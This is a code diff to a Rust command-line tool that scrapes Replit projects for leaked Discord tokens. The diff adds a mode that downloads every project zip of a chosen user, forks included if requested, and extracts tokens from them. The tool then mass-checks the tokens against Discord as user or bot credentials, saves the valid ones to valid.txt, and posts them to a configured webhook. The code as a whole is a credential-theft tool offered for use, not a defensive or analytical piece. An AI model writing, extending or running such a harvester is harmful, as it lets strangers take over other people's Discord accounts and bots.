@@ -3,11 +3,11 @@ use repl_api::{ReplAPI, ReplGlobal, fetch_zip};
 use ascii::{cli, options, clear};
 use util::{search_extract, write_file, fetch_lines};
 use tokio::main;
-use std::io::{stdin, stdout, Write};
 use serde::Deserialize;
 use serde_json::from_str;
 use std::fs;
 use reqwest::Client;
+use input_macro::input;
 
 
 #[derive(Debug, Deserialize)]
@@ -24,67 +24,62 @@ async fn main() {
     clear();
     cli();
     loop {
-
         options();
-        print!("
+        let option = input!("
 \x1b[0;34m╔═══ \x1b[0;91m╬ Please enter an Option ╬
 \x1b[0;34m║
 \x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
-        stdout().flush().unwrap();
-        let mut option = String::new();
-        stdin()
-            .read_line(&mut option)
-            .expect("Failed to read line");
         let option = option.trim().parse::<u32>();
 
         match option {
             Ok(option) => {
             match option {
                 1 => {
-                    let mut url = String::new();
-                    print!("
+                    let url = input!("
 \x1b[0;34m╔═══ \x1b[0;91m╬ Please enter a URL to scrape ╬ Example URL: /@someone/repo ╬
 \x1b[0;34m║
 \x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
-                    stdout().flush().unwrap();
-                    stdin()
-                        .read_line(&mut url)
-                        .expect("Failed to read line");
 
-                    let mut max = String::new();
-                    print!("
+
+                    let max = input!("
 \x1b[0;34m╔═══ \x1b[0;91m╬ Please enter the maximum you want to scrape ╬
 \x1b[0;34m║
 \x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
-                    stdout().flush().unwrap();
-                    stdin()
-                        .read_line(&mut max)
-                        .expect("Failed to read line");
-
                     let max = max.trim().parse::<u32>().unwrap();
 
                     scrape_url(url.trim(), max).await;
                 },
                 2 => check_tokens().await,
 
-
-
                 3 => {
 
-                    let mut max = String::new();
-                    print!("
+                    let max = input!("
 \x1b[0;34m╔═══ \x1b[0;91m╬ Please enter the maximum you want to scrape ╬
 \x1b[0;34m║
 \x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
-                    stdout().flush().unwrap();
-                    stdin()
-                        .read_line(&mut max)
-                        .expect("Failed to read line");
-
                     let max = max.trim().parse::<u32>().unwrap();
                     auto_scrape(max).await
                 },
+                4 => {
+                    let username = input!("
+\x1b[0;34m╔═══ \x1b[0;91m╬ Please enter a Username to scrape ╬ Example Username: YourMom ╬
+\x1b[0;34m║
+\x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
+                    let forks_option = input!("
+\x1b[0;34m╔═══ \x1b[0;91m╬ Would you like to scrape the forks? ╬ Y/N ╬
+\x1b[0;34m║
+\x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
+                    if forks_option.to_lowercase() == "y" {
+                        let max = input!("
+\x1b[0;34m╔═══ \x1b[0;91m╬ Please enter the maximum you want to scrape ╬
+\x1b[0;34m║
+\x1b[0;34m╚══[\x1b[0;93m>\x1b[0;34m]\x1b[0m ");
+                        user_scrape_with_fork(username, Some(max.parse::<u32>().unwrap())).await;
+                    } else {
+                        user_scrape(username).await;
+                    }
 
+                },
                 _ => continue
             }
             },
@@ -93,6 +88,148 @@ async fn main() {
     }
 
 }
+
+async fn user_scrape(username: String) {
+    let repl = ReplAPI {};
+    let mut unchecked_tokens = vec![];
+    let mut count = 0;
+    let zips = repl.fetch_zips_user(&username).await;
+    for zip in zips {
+        count += 1;
+        let mut token = search_extract(zip, count).await;
+        unchecked_tokens.append(&mut token);
+    }
+    for token in unchecked_tokens.clone() {
+        write_file("false_tokens.txt", &format!("{token}\n")).await;
+    }
+    let disc = Discord::new(unchecked_tokens.clone());
+    let valid_users = disc.mass_check_user().await;
+    println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+   \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+    let valid_bots = disc.mass_check_bot().await;
+    println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+   \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+    write_file("valid.txt", "User Tokens:\n\n").await;
+    for token in valid_users.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    write_file("valid.txt", "Bot Tokens:\n\n").await;
+    for token in valid_bots.clone() {
+        write_file("valid.txt", &format!("{token}\n")).await;
+    }
+    let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+    if let Ok(config) = config {
+        if let Some(webhook) = config.webhook {
+            let web = Webhook::new(&webhook);
+            web.send(&username, "User", valid_users).await;
+            web.send(&username, "Bot", valid_bots).await;
+        }
+    }
+    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
+}
+
+async fn user_scrape_with_fork(username: String, max: Option<u32>) {
+    let repl = ReplAPI{};
+    if let Some(max) = max {
+        let mut unchecked_tokens = vec![];
+        let mut count = 0;
+        let zips = repl.fetch_zips_with_forks_user(&username, max).await;
+        for zip in zips {
+            count += 1;
+            let mut token = search_extract(zip, count).await;
+            unchecked_tokens.append(&mut token);
+        }
+        for token in unchecked_tokens.clone() {
+            write_file("false_tokens.txt", &format!("{token}\n")).await;
+        }
+        let disc = Discord::new(unchecked_tokens.clone());
+        let valid_users = disc.mass_check_user().await;
+        println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+       \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+        let valid_bots = disc.mass_check_bot().await;
+        println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+       \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+        write_file("valid.txt", "User Tokens:\n\n").await;
+        for token in valid_users.clone() {
+            write_file("valid.txt", &format!("{token}\n")).await;
+        }
+        write_file("valid.txt", "Bot Tokens:\n\n").await;
+        for token in valid_bots.clone() {
+            write_file("valid.txt", &format!("{token}\n")).await;
+        }
+        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+        if let Ok(config) = config {
+            if let Some(webhook) = config.webhook {
+                let web = Webhook::new(&webhook);
+                web.send(&username, "User", valid_users).await;
+                web.send(&username, "Bot", valid_bots).await;
+            }
+        }
+        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
+    } else {
+        let mut unchecked_tokens = vec![];
+        let mut count = 0;
+        let zips = repl.fetch_zips_user(&username).await;
+        for zip in zips {
+            count += 1;
+            let mut token = search_extract(zip, count).await;
+            unchecked_tokens.append(&mut token);
+        }
+        for token in unchecked_tokens.clone() {
+            write_file("false_tokens.txt", &format!("{token}\n")).await;
+        }
+        let disc = Discord::new(unchecked_tokens.clone());
+        let valid_users = disc.mass_check_user().await;
+        println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+       \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
+        let valid_bots = disc.mass_check_bot().await;
+        println!("\x1b[0;34m
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
+       \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
+        write_file("valid.txt", "User Tokens:\n\n").await;
+        for token in valid_users.clone() {
+            write_file("valid.txt", &format!("{token}\n")).await;
+        }
+        write_file("valid.txt", "Bot Tokens:\n\n").await;
+        for token in valid_bots.clone() {
+            write_file("valid.txt", &format!("{token}\n")).await;
+        }
+        let config:Result<Config, serde_json::Error> = from_str(&fs::read_to_string("./config.json").unwrap());
+        if let Ok(config) = config {
+            if let Some(webhook) = config.webhook {
+                let web = Webhook::new(&webhook);
+                web.send(&username, "User", valid_users).await;
+                web.send(&username, "Bot", valid_bots).await;
+            }
+        }
+        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await
+    }
+
+}
+
 
 async fn auto_scrape(max: u32) {
     let repl = ReplGlobal{};
@@ -104,6 +241,7 @@ async fn auto_scrape(max: u32) {
     urls.append(&mut gathered.1);
     urls.append(&mut gathered.2);
     let urls = repl.fetch_urls_global(urls).await;
+
 
 
     let client = Client::new();
@@ -119,17 +257,17 @@ async fn auto_scrape(max: u32) {
         let disc = Discord::new(unchecked_tokens.clone());
         let valid_users = disc.mass_check_user().await;
         println!("\x1b[0;34m
-    ╔════════════════════════╬
-    ║ Valid User Tokens: {}
-    ║ Total invalid: {}
-    ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
     \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
         let valid_bots = disc.mass_check_bot().await;
         println!("\x1b[0;34m
-    ╔════════════════════════╬
-    ║ Valid Bot Tokens: {}
-    ║ Total invalid: {}
-    ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
     \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
         write_file("valid.txt", "User Tokens:\n\n").await;
         for token in valid_users.clone() {
@@ -156,17 +294,17 @@ async fn check_tokens() {
     let disc = Discord::new(unchecked_tokens.clone());
     let valid_users = disc.mass_check_user().await;
     println!("\x1b[0;34m
-   ╔════════════════════════╬
-   ║ Valid User Tokens: {}
-   ║ Total invalid: {}
-   ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
     let valid_bots = disc.mass_check_bot().await;
     println!("\x1b[0;34m
-   ╔════════════════════════╬
-   ║ Valid Bot Tokens: {}
-   ║ Total invalid: {}
-   ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
     write_file("valid.txt", "User Tokens:\n\n").await;
     for token in valid_users.clone() {
@@ -203,17 +341,17 @@ async fn scrape_url(url: &str, count: u32) {
     let disc = Discord::new(unchecked_tokens.clone());
     let valid_users = disc.mass_check_user().await;
     println!("\x1b[0;34m
-   ╔════════════════════════╬
-   ║ Valid User Tokens: {}
-   ║ Total invalid: {}
-   ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid User Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
    \x1b[0m", &valid_users.len(), unchecked_tokens.len() - valid_users.len());
     let valid_bots = disc.mass_check_bot().await;
     println!("\x1b[0;34m
-   ╔════════════════════════╬
-   ║ Valid Bot Tokens: {}
-   ║ Total invalid: {}
-   ╚════════════════════════╬
+╔════════════════════════╬
+║ Valid Bot Tokens: {}
+║ Total invalid: {}
+╚════════════════════════╬
    \x1b[0m", &valid_bots.len(), unchecked_tokens.len() - valid_bots.len());
     write_file("valid.txt", "User Tokens:\n\n").await;
     for token in valid_users.clone() {
